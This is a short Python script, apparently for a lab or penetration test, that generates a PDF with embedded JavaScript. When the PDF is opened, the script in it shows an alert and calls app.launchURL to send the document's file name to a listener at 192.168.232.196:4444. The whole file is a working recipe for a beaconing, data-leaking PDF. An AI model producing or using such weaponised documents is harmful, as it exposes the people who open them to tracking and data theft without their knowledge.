from fpdf import FPDF
from PyPDF2 import PdfReader, PdfWriter

class PDF(FPDF):
    def header(self):
        self.set_font('Arial', 'B', 12)
        self.cell(0, 10, 'PDF with Embedded JavaScript', 0, 1, 'C')

    def footer(self):
        self.set_y(-15)
        self.set_font('Arial', 'I', 8)
        self.cell(0, 10, f'Page {self.page_no()}', 0, 0, 'C')

# Crear el PDF utilizando fpdf
pdf = PDF()
pdf.add_page()
pdf.set_font('Arial', 'B', 16)
pdf.cell(40, 10, 'Hello World!')

# Guardar el PDF a un archivo temporal
temp_pdf_path = 'temp.pdf'
pdf.output(temp_pdf_path)

# Leer el PDF con PyPDF2
with open(temp_pdf_path, 'rb') as f:
    reader = PdfReader(f)
    writer = PdfWriter()
    writer.add_page(reader.pages[0])

    # Agregar JavaScript
    js_code = '''
    app.alert('This is an alert message from an embedded JavaScript!');
    app.launchURL('http://192.168.232.196:4444/collect?info=' + escape(this.info.DocumentFileName));
    '''
    writer.add_js(js_code)

    # Guardar el nuevo PDF con JavaScript
    with open('document_with_js.pdf', 'wb') as output_pdf:
        writer.write(output_pdf)

print("PDF created with embedded JavaScript")
